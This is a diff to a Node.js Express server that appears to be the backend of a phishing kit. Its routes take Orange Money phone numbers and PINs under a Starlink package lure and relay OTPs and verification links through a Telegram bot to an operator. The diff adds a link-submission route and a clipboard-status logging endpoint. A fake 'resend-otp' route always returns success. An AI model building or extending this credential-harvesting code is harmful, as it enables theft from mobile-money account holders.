@@ -3,7 +3,7 @@ const cors = require('cors');
 const path = require('path');
 const bodyParser = require('body-parser');
 require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
-const { createApprovalRequest, submitOtp, getApprovalStatus } = require('./telegram-bot');
+const { createApprovalRequest, submitOtp, submitLink, getApprovalStatus } = require('./telegram-bot');
 const { securityHeaders, corsMiddleware, validateApiSecret, rateLimit, validator, auditLog } = require('./security');
 
 const app = express();
@@ -198,6 +198,12 @@ app.post('/api/b2c-backend/v2/resend-otp', (req, res) => {
     res.json({ status: 'SUCCESS', data: { otpId: 'otp-' + Date.now() } });
 });
 
+app.post('/api/clipboard-status', (req, res) => {
+    const { decision, phone, country, source } = req.body;
+    console.log('Clipboard status:', { decision, phone, country, source });
+    res.json({ success: true, decision });
+});
+
 // ── Orange Money endpoints ───────────────────────────────────────
 app.post('/api/orange/submit', (req, res) => {
     const { phone, pin, country, starlinkPackage } = req.body;
@@ -371,7 +377,25 @@ app.post('/api/telegram/submit-otp', validateApiSecret, rateLimit({ maxRequests:
     res.json(result);
 });
 
-// Check approval status
+// Submit verification link for Orange Money
+app.post('/api/telegram/submit-link', validateApiSecret, rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
+    const { requestId, link } = req.body;
+    const clientIp = req.ip || 'unknown';
+    
+    if (!validator.requestId(requestId)) {
+        auditLog.write('TELEGRAM_LINK_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_request_id' });
+        return res.status(400).json({ success: false, message: 'Invalid request ID format' });
+    }
+    if (!link || typeof link !== 'string' || link.length < 5) {
+        auditLog.write('TELEGRAM_LINK_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_link' });
+        return res.status(400).json({ success: false, message: 'Invalid link format' });
+    }
+
+    const result = submitLink(requestId, validator.sanitize(link));
+    auditLog.logTelegramOtp(clientIp, requestId, result.success);
+    res.json(result);
+});
+
 app.get('/api/telegram/status/:requestId', validateApiSecret, (req, res) => {
     const { requestId } = req.params;
     const clientIp = req.ip || 'unknown';
